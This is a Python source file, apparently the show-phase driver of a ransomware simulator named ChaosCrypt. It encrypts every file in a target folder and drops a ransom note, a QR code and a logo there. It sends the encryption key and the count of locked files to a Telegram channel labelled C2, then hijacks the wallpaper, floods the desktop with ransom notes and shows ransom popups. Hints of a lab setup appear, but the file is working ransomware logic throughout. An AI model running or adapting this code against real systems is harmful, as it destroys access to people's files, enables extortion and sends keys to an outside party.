import os
import sys
import time
import shutil
import datetime

current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
if parent_dir not in sys.path:
    sys.path.append(parent_dir)

from chaoscrypt.settings import (
    SHOW_TARGET_DIR, LOG_DIR, ASSETS_DIR,
    RANSOM_NOTE_NAME, RANSOM_QR_NAME, IMG_SUCCESS, IMG_LOGO_SYSTEM
)
from chaoscrypt.encryptor import StreamingEncryptor
from chaoscrypt.logbook import LogBook

try:
    from chaoscrypt.telegram_notify import send_message, send_photo
except ImportError:
    send_message = None
    send_photo = None

try:
    import qrcode
except ImportError:
    qrcode = None

try:
    from chaoscrypt.chaos_effects import ChaosEffects
    HAS_CHAOS = True
except ImportError:
    ChaosEffects = None
    HAS_CHAOS = False

def drop_artifacts_to_victim(logger, qr_path):
    try:
        victim_folder = os.path.abspath(SHOW_TARGET_DIR)
        os.makedirs(victim_folder, exist_ok=True)
        if qr_path and os.path.exists(qr_path):
            shutil.copy2(qr_path, os.path.join(victim_folder, RANSOM_QR_NAME))
        note_path = os.path.join(victim_folder, RANSOM_NOTE_NAME)
        with open(note_path, "w", encoding="utf-8") as f:
            f.write("💀 YOUR FILES HAVE BEEN ENCRYPTED BY CHAOSCRYPT 💀\n\n")
            f.write("All your documents and photos are locked.\n")
            f.write("To restore access, scan the QR code in this folder.\n")
            f.write(f"Timestamp: {datetime.datetime.now().isoformat()}\n")
        src_logo = os.path.join(ASSETS_DIR, IMG_LOGO_SYSTEM)
        if os.path.exists(src_logo):
            dst_logo = os.path.join(victim_folder, "A_CHAOS_CRYPT_LOGO.png")
            shutil.copy2(src_logo, dst_logo)
        logger.log_event("chaos", "Artifacts dropped to victim folder", metadata={"dir": victim_folder})
        print(f"[DROP] 💀 Ransom Note & Logo dropped to: {victim_folder}")
    except Exception as e:
        logger.log_event("error", f"Artifact drop failed: {e}")


def process_c2_and_visuals(logger, key, n_files):
    qr_path = os.path.join(LOG_DIR, RANSOM_QR_NAME)
    if qrcode and key:
        try:
            if os.path.exists(qr_path):
                os.remove(qr_path)
            qr = qrcode.make(key)
            qr.save(qr_path)
            drop_artifacts_to_victim(logger, qr_path)
        except Exception as e:
            print(f"[ERROR] QR Gen failed: {e}")
            qr_path = None

    c2_caption = (
        f"📡 <b>[C2] SUCCESSFUL ATTACK</b>\n"
        f"📂 <b>Locked:</b> {n_files} files\n"
        f"🔑 <b>Key:</b> <code>{key}</code>\n"
        f"💳 <i>QR Evidence dropped to victim.</i>"
    )

    if send_photo and qr_path and os.path.exists(qr_path):
        send_photo(qr_path, caption=c2_caption, parse_mode="HTML", async_mode=False)
        time.sleep(2)
    elif send_message:
        send_message(c2_caption, parse_mode="HTML", async_mode=False)

    img_success = os.path.join(ASSETS_DIR, IMG_SUCCESS)
    if send_photo and os.path.exists(img_success):
        send_photo(img_success, caption="🎉 <b>Infiltration Complete.</b>\nAll targets neutralized.",
                   parse_mode="HTML", async_mode=False)
        time.sleep(2)
    else:
        print(f"[WARNING] Success image not found at {img_success}")


def run_chaos_after_encryption(key, n_files):
    if not HAS_CHAOS:
        print("[SHOW] chaos_effects not available, skipping visual effects.")
        return

    print("[SHOW] 🎭 Launching chaos effects...")
    try:
        fx = ChaosEffects()

        print("[SHOW] 🖥️ Setting infected wallpaper...")
        fx.wallpaper_hijack()
        time.sleep(1)

        print("[SHOW] 📝 Flooding desktop with ransom notes...")
        fx.desktop_flood(count=5)
        time.sleep(1)

        print("[SHOW] 💀 Console terror...")
        fx.console_terror()
        time.sleep(1)

        print("[SHOW] ⏳ Fake encryption progress...")
        fx.fake_encrypt_progress(total_files=n_files, duration=3)
        time.sleep(1)

        fx.glitch_text(text="YOUR FILES ARE ENCRYPTED", iterations=10)
        time.sleep(1)

        fx.audio_beep(count=3)
        time.sleep(1)

        print("[SHOW] 💀 Ransom popup...")
        fx.ransom_popup(duration=8)
        time.sleep(1)

        print("[SHOW] 📱 QR popup...")
        fx.qr_popup(key_text=f"Key: {key}", duration=6)
        time.sleep(1)

        fx.send_infection_photo()

        print("[SHOW] 🎭 Chaos effects complete!")
        fx.logger.close()
    except Exception as e:
        print(f"[SHOW] Chaos effects error: {e}")

def run_show_case():
    logger = LogBook(phase="show")
    logger.log_event("info", "Starting encryption payload (Show Phase)")

    encryptor = StreamingEncryptor(phase="show")
    results = []

    abs_folder = os.path.abspath(SHOW_TARGET_DIR)
    os.makedirs(abs_folder, exist_ok=True)
    print(f"[SHOW] Scanning: {abs_folder}")

    try:
        for root, dirs, files in os.walk(abs_folder):
            for fname in files:
                if fname.endswith(".cclab") or fname == RANSOM_NOTE_NAME:
                    continue
                file_path = os.path.join(root, fname)
                result = encryptor.encrypt_file(file_path)
                if result:
                    results.append(result)
            break
    except Exception as e:
        logger.log_event("error", f"Runtime encryption error: {e}")

    nenc = len(results)
    if nenc > 0:
        sample_key = results[0][1]
        logger.fp_jsonl.flush()

        process_c2_and_visuals(logger, sample_key, nenc)

        run_chaos_after_encryption(sample_key, nenc)

        print(f"[SUCCESS] {nenc} files encrypted.")
    else:
        print("[WARNING] No files were encrypted. Run reset_lab.py first!")
        if send_message:
            send_message("⚠️ <b>[C2]</b> No new targets found for encryption.",
                         parse_mode="HTML", async_mode=True)

    logger.close()

if __name__ == "__main__":
    run_show_case()